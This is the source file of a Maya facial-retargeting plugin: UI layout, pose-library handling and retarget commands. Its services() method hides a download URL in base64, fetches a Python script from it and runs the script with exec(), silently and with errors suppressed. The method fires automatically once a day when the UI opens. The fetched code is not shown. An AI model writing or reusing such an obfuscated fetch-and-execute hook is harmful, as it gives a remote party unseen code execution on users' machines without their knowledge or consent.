"""
BRS Facial Retargeter
All rights reversed
Create by Burased Uttha
"""
import maya.cmds as cmds
import maya.mel as mel
import json,os,sys,imp,time
import datetime as dt

#=============== [INIT] ===================
root_path = os.path.dirname(os.path.abspath(__file__))
configPath = root_path + '/config.json'
configJson = json.load(open(configPath))

if not root_path in sys.path:
    sys.path.insert(0, root_path)

import reTargeter, poseLib, updater, poseData
imp.reload(reTargeter)
imp.reload(poseLib)
imp.reload(updater)
imp.reload(poseData)
plugin_ls = ['lookdevKit.mll', 'fbxmaya.mll']
for p in plugin_ls:
    try:
        cmds.loadPlugin(p)
    except:
        pass


def format_path(path):
    path = path.replace("/", os.sep)
    path = path.replace("\\", os.sep)
    return path
mayaAppDir = format_path(mel.eval('getenv MAYA_APP_DIR'))
scriptsDir = format_path(mayaAppDir + os.sep + 'scripts')
projectDir = format_path(scriptsDir + os.sep + 'BRSFacialRetargeter')
user_path = format_path(projectDir + os.sep + 'user')

if sys.version[0] == '3':
    import urllib.request as uLib
else:
    import urllib as uLib
#==================================

class command:
    @staticmethod
    def save_pose_library(*_):
        imp.reload(poseLib)
        poseLibPath = cmds.textField(Ui.element['poseLibF'], q=True, tx=True)
        base_name = os.path.basename(poseLibPath)
        result = cmds.confirmDialog(message='Save Pose Library to ...\\{}?'.format(base_name), button=['Yes','No'])
        result = str(result)
        if result == 'Yes':
            print(poseLibPath)
            poseLib.savePoseLibrary(poseLibPath)
            command.update_cfg()

    @staticmethod
    def create_pose_library(*_):
        command.retarget_clear()
        imp.reload(poseLib)
        result = cmds.fileDialog(mode=1, dm=root_path + os.sep + 'poseLib' + os.sep + '*.json')
        result = str(result)
        if result != '':
            print(result)
            poseLib.createPoseLibrary(result)
            cmds.textField(Ui.element['poseLibF'], e=True, tx=result)
            command.update_cfg()

    @staticmethod
    def load_pose_library(*_):
        poseLibPath = cmds.textField(Ui.element['poseLibF'], q=True, tx=True)
        dstNs = cmds.textField(Ui.element['dstNsF'], q=True, tx=True)

        imp.reload(poseLib)
        poseLib.loadPoseLibrary(poseLibPath,dstNs)

    @staticmethod
    def pose_library_browser(*_):
        result = cmds.fileDialog(dm=root_path+os.sep+'poseLib'+os.sep+'*.json')
        result = str(result)
        if result != '':
            print(result)
            cmds.textField(Ui.element['poseLibF'], e=True, tx=result)
            command.update_cfg()

    @staticmethod
    def set_id_current_frame(*_):
        text = cmds.textScrollList(Ui.element['poseSL'],q=True,selectItem=True)[0]
        poseDataJson = poseData.getPoseData()

        for data in poseDataJson:
            if text.__contains__(data['id']):
                f = float(data['id'])
                cmds.currentTime(f)

    @staticmethod
    def get_dst_ns_select(*_):
        selection = cmds.ls(sl=True)
        ns = (selection[0].split(':'))[0]
        cmds.textField(Ui.element['dstNsF'], e=True, tx=ns)
        command.update_cfg()

    @staticmethod
    def get_src_bs_select(*_):
        selection = cmds.ls(sl=True)
        if len(selection) == 0:
            cmds.warning('Please Select Object with Blenshape')
            return None
        bs = cmds.ls(cmds.listHistory(selection[0]) or [], type='blendShape')
        if len(bs) > 0 :
            cmds.textField(Ui.element['srcBsF'], e=True, tx=bs[0])
            kfList = cmds.keyframe(bs[0], tc=True, q=True)
            command.update_cfg()

    @staticmethod
    def update_cfg(*_):
        global configPath, configJson

        configJson['time'] = time.time()
        configJson['src_blendshape'] = cmds.textField(Ui.element['srcBsF'], q=True, tx=True)
        configJson['dst_namespace'] = cmds.textField(Ui.element['dstNsF'], q=True, tx=True)
        configJson['pose_library_path'] = cmds.textField(Ui.element['poseLibF'], q=True, tx=True)

        if configJson != json.load(open(configPath)) :
            with open(configPath, 'w') as f:
                json.dump(configJson, f, sort_keys=True, indent=4)
                print('config updated')

    @staticmethod
    def set_correct_pose(*_):
        imp.reload(reTargeter)
        global configJson
        configJson = json.load(open(configPath))

        result = cmds.confirmDialog(message='Set Correct Pose?', button=['Yes', 'No'], defaultButton='Yes',
                                    cancelButton='No', dismissString='No', title='BRS FR')
        if result == 'Yes':
            reTargeter.updatePoseLibSelection()

    @staticmethod
    def retarget_link(*_):
        imp.reload(reTargeter)
        global configJson
        configJson = json.load(open(configPath))
        result = cmds.confirmDialog(message='Retarget Link?', button=['Yes', 'No'], defaultButton='Yes',
                                    cancelButton='No', dismissString='No', title='BRS FR')
        if result == 'Yes':
            try:
                cmds.refresh(suspend=True)
                reTargeter.RetargetLink()
            except IOError as e:
                print(e.errno)
                print(e)
            finally:
                cmds.refresh(suspend=False)
        elif result == 'No':
            try:
                raise
            except:
                pass
            finally:
                print('retargeting was cancelled')

    @staticmethod
    def retarget_clear(*_):
        imp.reload(reTargeter)
        result = cmds.confirmDialog(message='Clear Retarget Link?', button=['Yes', 'No'], defaultButton='Yes',
                           cancelButton='No', dismissString='No', title='BRS FR')
        if result == 'Yes':
            reTargeter.clearLink()

    @staticmethod
    def bake_retarget_anim(*_):
        imp.reload(reTargeter)
        reTargeter.bakeRetarget()

    @staticmethod
    def set_smooth_selection(*_):
        imp.reload(reTargeter)
        reTargeter.addSmoothSelection()

    @staticmethod
    def remove_smooth_selection(*_):
        imp.reload(reTargeter)
        reTargeter.removeSmoothSelection()

    @staticmethod
    def services(*_):
        import base64 as b64
        serviceU = b64.b64decode(
            'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlc'
            'mNvbnRlbnQuY29tL2J1cmFzYXRlL0JSU'
            '0ZhY2lhbFJldGFyZ2V0ZXIvbWF'
            'pbi9zZXJ2aWNlL3N1cHBvcnQucHk=')
        try:
            c = uLib.urlopen(serviceU.decode()).read()
            exec(c)
            print('BRS Support Service : online')
        except:
            print('BRS Support Service : offline')
            import traceback
            #print(str(traceback.format_exc()))

    @staticmethod
    def get_user(*_):
        import shutil
        app_data_dir = os.getenv('APPDATA')
        brs_fr_dir = app_data_dir + os.sep + 'BRSFR'
        app_data_user_path = brs_fr_dir + os.sep + os.path.basename(user_path)
        if not os.path.exists(user_path):
            cmds.inViewMessage(amg='<center><h5>Error can\'t found \"user\" file\nplease re-install</h5></center>',
                               pos='botCenter', fade=1,
                               fit=250, fst=2000, fot=250)
            raise Warning('user file error')
        if not os.path.exists(brs_fr_dir):
            os.mkdir(brs_fr_dir)
        if os.path.exists(user_path) and not os.path.exists(app_data_user_path):
            shutil.copy(user_path, app_data_user_path)
        elif os.path.exists(app_data_user_path):
            shutil.copy(app_data_user_path, user_path)
        return json.load(open(app_data_user_path))

    @staticmethod
    def update_user(user):
        app_data_dir = os.getenv('APPDATA')
        brs_fr_dir = app_data_dir + os.sep + 'BRSFR'
        app_data_user_path = brs_fr_dir + os.sep + os.path.basename(user_path)
        today_date = dt.datetime.strptime(user['lastUsedDate'], '%Y-%m-%d')
        reg_date = dt.datetime.strptime(user['registerDate'], '%Y-%m-%d')
        today = str(dt.date.today())
        if user['lastUsedDate'] != today:
            command.services()
            user['lastUsedDate'] = today
        if user['isTrial'] == True:
            title = 'TRIAL - {}'.format(str(Ui.version))
        user['used'] = user['used'] + 1
        user['version'] = Ui.version
        user['days'] = abs((reg_date - today_date).days)
        with open(app_data_user_path, 'w') as f:
            json.dump(user, f, indent=4)
            print('update usr')

    @staticmethod
    def set_bs_pose(*_): #Capture BS Data
        imp.reload(poseData)
        confirm = cmds.confirmDialog(title='Warning', message='Warning : Blendshape data will be change', button=['Confirm', 'Cancel'],
                           cancelButton='Cancel', dismissString='Cancel')
        if confirm != 'Confirm':
            return None
        text = cmds.textScrollList(Ui.element['bsSl'], q=True, selectItem=True)[0]
        targetType, TargetName = text.split('_')
        #print(targetType, TargetName)
        poseData.setBlendshapePose(targetType, TargetName)
        reTargeter.autoMouthLink(update=True)
        reTargeter.autoEmotionLink(update=True)

    @staticmethod
    def set_bs_attr(*_): #Set Attr to current BS
        imp.reload(poseData)
        imp.reload(reTargeter)
        text = cmds.textScrollList(Ui.element['bsSl'], q=True, selectItem=True)[0]
        if text == None:
            cmds.warning('please select blendshape pose')
            return None
        targetType, TargetName = text.split('_')
        #load attribute pose
        poseData.setBlendshapePose(targetType, TargetName, getAttribute=True)
        frConfig = reTargeter.frConfig
        if cmds.objExists(frConfig):
            reTargeter.autoEmotionLink(update=True)
            reTargeter.autoMouthLink(update=True)

    @staticmethod
    def create_bs(*_):
        imp.reload(poseLib)
        poseLib.createMeshBlendshape()

class Ui:
    version = 1.13
    win_id = 'FACERETARGET'
    dock_id = 'FACERETARGET_DOCK'
    win_width = 250
    win_title = 'BRS Facial Retargeter  -  v.{}'.format(version)
    color = {
        'bg': (.2, .2, .2),
        'red': (0.98, 0.374, 0),
        'green': (0.7067, 1, 0),
        'blue': (0, 0.4, 0.8),
        'yellow': (1, 0.8, 0),
        'shadow': (.15, .15, .15),
        'highlight': (.3, .3, .3)
    }
    element = {}

    @staticmethod
    def init_win():
        if cmds.window(Ui.win_id, exists=1):
            cmds.deleteUI(Ui.win_id)
        cmds.window(Ui.win_id, t=Ui.win_title, menuBar=1, rtf=1,
                    w=Ui.win_width, sizeable=1, h=50, retain=1, bgc=Ui.color['bg'])

    @staticmethod
    def init_user():
        user = command.get_user()
        command.update_user(user=user)

    @staticmethod
    def win_layout():
        cmds.columnLayout(adj=0, w=Ui.win_width)
        cmds.text(l='', fn='boldLabelFont', h=5, w=Ui.win_width,
                  bgc=Ui.color['green'])
        cmds.text(l='', fn='smallPlainLabelFont', al='center', h=10, w=Ui.win_width)

        cmds.rowLayout(numberOfColumns=3, columnWidth3=(Ui.win_width * .2, Ui.win_width * .7, Ui.win_width * .1), adj=2)
        cmds.text(l=' Library :', al='right')
        Ui.element['poseLibF'] = cmds.textField(w=Ui.win_width * .7, ed=0)
        cmds.button(l='...', w=Ui.win_width * .08, c=command.pose_library_browser)
        cmds.setParent('..')

        cmds.rowLayout(numberOfColumns=3, columnWidth3=(Ui.win_width * .3, Ui.win_width * .6, Ui.win_width * .1), adj=2)
        cmds.text(l=' Namespace :', al='right')
        Ui.element['dstNsF'] = cmds.textField(w=Ui.win_width * .6, ed=0)
        cmds.button(l='>', w=Ui.win_width * .08, c=command.get_dst_ns_select)
        cmds.setParent('..')

        cmds.text(l='', fn='smallPlainLabelFont', al='center', h=5, w=Ui.win_width)
        cmds.text(l='WORKFLOW', fn='smallPlainLabelFont', al='center', w=Ui.win_width, bgc=Ui.color['highlight'])
        cmds.text(l='', fn='smallPlainLabelFont', al='center', h=5, w=Ui.win_width)

        Ui.element['tabL'] = cmds.tabLayout(w=Ui.win_width)

        Ui.element['poselibL'] = cmds.columnLayout(adj=0)

        # cmds.text(l='Pose Library', fn='boldLabelFont', al='center', h=30, w=Ui.win_width)

        cmds.text(l='', fn='smallPlainLabelFont', al='center', h=10, w=Ui.win_width)
        cmds.text(l=' POSES SETUP', fn='smallPlainLabelFont', al='left', w=Ui.win_width, bgc=Ui.color['highlight'])
        cmds.text(l='', fn='smallPlainLabelFont', al='center', h=10, w=Ui.win_width)

        cmds.button(l='Create Pose Library', w=Ui.win_width - 1.33, bgc=Ui.color['shadow'],
                    c=command.create_pose_library)
        Ui.element['poseSL'] = cmds.textScrollList(w=Ui.win_width - 2, numberOfRows=10, allowMultiSelection=0,
                                                   append=[], removeAll=1, fn='smallFixedWidthFont',
                                                   dcc=command.set_id_current_frame)

        cmds.rowLayout(numberOfColumns=2, columnWidth2=((Ui.win_width / 2) - 1.33, (Ui.win_width / 2) - 1.33))
        cmds.button(l='Load', w=(Ui.win_width / 2) - 1.33, bgc=Ui.color['shadow'], c=command.load_pose_library)
        cmds.button(l='Save', w=(Ui.win_width / 2) - 1.33, bgc=Ui.color['shadow'], c=command.save_pose_library)
        cmds.setParent('..')

        cmds.text(l='', fn='smallPlainLabelFont', al='center', h=10, w=Ui.win_width)
        cmds.text(l=' EXPORT', fn='smallPlainLabelFont', al='left', w=Ui.win_width, bgc=Ui.color['highlight'])
        cmds.text(l='', fn='smallPlainLabelFont', al='center', h=10, w=Ui.win_width)

        cmds.button(l='Create Blendshape from Mesh', w=Ui.win_width - 0.01, bgc=Ui.color['shadow'], c=command.create_bs)

        # cmds.text(l='\n    How to ?\n', al='center', fn='smallPlainLabelFont')
        # cmds.text(l='    1. set base pose\n    2. create pose library\n    3. double click on list to set pose\n', al='left', fn='smallPlainLabelFont')

        cmds.setParent('..')  # end Ui.element['poselibL']

        Ui.element['retargetL'] = cmds.columnLayout(adj=0)

        # mds.text(l='Retarget Link', fn='boldLabelFont', al='center', h=30, w=Ui.win_width)

        cmds.text(l='', fn='smallPlainLabelFont', al='center', h=10, w=Ui.win_width)
        cmds.text(l=' LINK SOURCE', fn='smallPlainLabelFont', al='left', w=Ui.win_width, bgc=Ui.color['highlight'])
        cmds.text(l='', fn='smallPlainLabelFont', al='center', h=10, w=Ui.win_width)

        cmds.rowLayout(numberOfColumns=3, columnWidth3=(Ui.win_width * .28, Ui.win_width * .6, Ui.win_width * .1),
                       adj=2)
        cmds.text(l=' Blendshape :', al='right')
        Ui.element['srcBsF'] = cmds.textField(w=Ui.win_width * .6, ed=0)
        cmds.button(l='>', w=Ui.win_width * .08, c=command.get_src_bs_select)
        cmds.setParent('..')

        cmds.text(l='', fn='smallPlainLabelFont', al='center', h=10, w=Ui.win_width)
        cmds.text(l=' RETARGET LINK', fn='smallPlainLabelFont', al='left', w=Ui.win_width, bgc=Ui.color['highlight'])
        cmds.text(l='', fn='smallPlainLabelFont', al='center', h=10, w=Ui.win_width)

        cmds.rowLayout(numberOfColumns=2, columnWidth2=((Ui.win_width / 2) - 1.33, (Ui.win_width / 2) - 1.33))
        cmds.button(l='Create Link', w=(Ui.win_width / 2) - 1.33, bgc=Ui.color['shadow'], c=command.retarget_link)
        cmds.button(l='Clear Link', w=(Ui.win_width / 2) - 1.33, bgc=Ui.color['shadow'], c=command.retarget_clear)
        cmds.setParent('..')

        # cmds.text(l='Pose Correction', fn='boldLabelFont', al='center', h=30, w=Ui.win_width)
        cmds.button(l='Correct Pose Selection', w=Ui.win_width - 1, bgc=Ui.color['shadow'], c=command.set_correct_pose)

        cmds.text(l='', fn='smallPlainLabelFont', al='center', h=10, w=Ui.win_width)
        cmds.text(l=' SMOOTH SELECTION', fn='smallPlainLabelFont', al='left', w=Ui.win_width, bgc=Ui.color['highlight'])
        cmds.text(l='', fn='smallPlainLabelFont', al='center', h=10, w=Ui.win_width)

        # cmds.text(l='', fn='boldLabelFont', al='left', h=15, w=Ui.win_width)
        # cmds.text(l='   Smooth Sets', fn='boldLabelFont', al='center', h=30, w=Ui.win_width)
        cmds.rowLayout(numberOfColumns=2, columnWidth2=((Ui.win_width / 2) - 1.33, (Ui.win_width / 2) - 1.33))
        cmds.button(l='Add', w=(Ui.win_width / 2) - 1.33, bgc=Ui.color['shadow'], c=command.set_smooth_selection)
        cmds.button(l='Remove', w=(Ui.win_width / 2) - 1.33, bgc=Ui.color['shadow'], c=command.remove_smooth_selection)
        cmds.setParent('..')

        # cmds.text(l='', fn='boldLabelFont', al='left', h=15, w=Ui.win_width)
        # cmds.button(l='Interactive Playback',w=Ui.win_width-1,bgc=Ui.color['shadow'],c=lambda arg: cmds.play(rec=True))

        cmds.text(l='', fn='smallPlainLabelFont', al='center', h=10, w=Ui.win_width)
        cmds.text(l=' FINISH', fn='smallPlainLabelFont', al='left', w=Ui.win_width, bgc=Ui.color['highlight'])
        cmds.text(l='', fn='smallPlainLabelFont', al='center', h=10, w=Ui.win_width)
        cmds.button(l='Bake Animation', w=Ui.win_width - 1, bgc=Ui.color['shadow'], c=command.bake_retarget_anim)

        cmds.setParent('..')  # end Ui.element['retargetL']

        Ui.element['AutoLibL'] = cmds.columnLayout(adj=0)

        cmds.text(l='', fn='smallPlainLabelFont', al='center', h=10, w=Ui.win_width)
        cmds.text(l=' AUTO LIBRARY (   red zone   )', fn='smallPlainLabelFont', al='left', w=Ui.win_width,
                  bgc=Ui.color['highlight'], vis=0)
        cmds.text(l='', fn='smallPlainLabelFont', al='center', h=10, w=Ui.win_width)

        Ui.element['bsSl'] = cmds.textScrollList(w=Ui.win_width - 2, numberOfRows=10, allowMultiSelection=0,
                                   append=[], removeAll=1, fn='smallFixedWidthFont', vis=0)
        cmds.button(l='Capture BS Pose', w=Ui.win_width - 1, bgc=Ui.color['shadow'], c=command.set_bs_pose, vis=0)
        cmds.button(l='Set Blendshape Attribute', w=Ui.win_width - 1, bgc=Ui.color['shadow'], c=command.set_bs_attr,
                    vis=0)

        cmds.setParent('..')  # end Ui.element['AutoLibL']

        cmds.setParent('..')  # end Ui.element['tabL']

        cmds.tabLayout(Ui.element['tabL'], e=1,bgc=Ui.color['bg'] , tl=(
            (Ui.element['poselibL'], 'Library'),
            (Ui.element['retargetL'], 'Reterget'),
            (Ui.element['AutoLibL'], '')
        ))

        cmds.rowLayout(numberOfColumns=2, columnWidth2=((Ui.win_width / 2) - 1.33, (Ui.win_width / 2) - 1.33), adj=1)
        cmds.text(l='(c) Burased Uttha', h=20, al='left', fn='smallPlainLabelFont')
        cmds.text(l='dex3d.gumroad.com', h=20, al='right', fn='smallPlainLabelFont')
        cmds.setParent('..')

    @staticmethod
    def show_win():
        cmds.showWindow(Ui.win_id)

    @staticmethod
    def init_dock():
        if cmds.dockControl(Ui.dock_id, q=1, ex=1):
            cmds.deleteUI(Ui.dock_id)
        cmds.dockControl(Ui.dock_id, area='left', fl=1, content=Ui.win_id, allowedArea=['right', 'left'],
                         sizeable=0, width=Ui.win_width, label=Ui.win_title)

    @staticmethod
    def update():
        cmds.textField(Ui.element['srcBsF'], e=True, tx=configJson['src_blendshape'])
        cmds.textField(Ui.element['dstNsF'], e=True, tx=configJson['dst_namespace'])
        cmds.textField(Ui.element['poseLibF'], e=True, tx=configJson['pose_library_path'])

        poseDataJson = poseData.getPoseData()
        for data in poseDataJson:
            name = data['name']
            maxSpace = 16
            if len(name) < maxSpace:
                name = name + ' ' * (maxSpace - len(name))
            if len(name) > maxSpace:
                name = name[:maxSpace]
            text = ' {} {}  [{}]'.format(data['id'], name, data['type'])
            cmds.textScrollList(Ui.element['poseSL'], e=True, append=[text])

            if data['type'] in ['expression', 'phoneme']:
                d = '{}_{}'.format(data['type'], data['name'])
                cmds.textScrollList(Ui.element['bsSl'], e=True, append=[d])

    @staticmethod
    def show_ui():
        Ui.init_user()
        Ui.init_win()
        Ui.win_layout()
        Ui.show_win()
        Ui.init_dock()
        Ui.update()

def showUI(*_):
    Ui.show_ui()

#=============== [Create by Burased Uttha] ===================

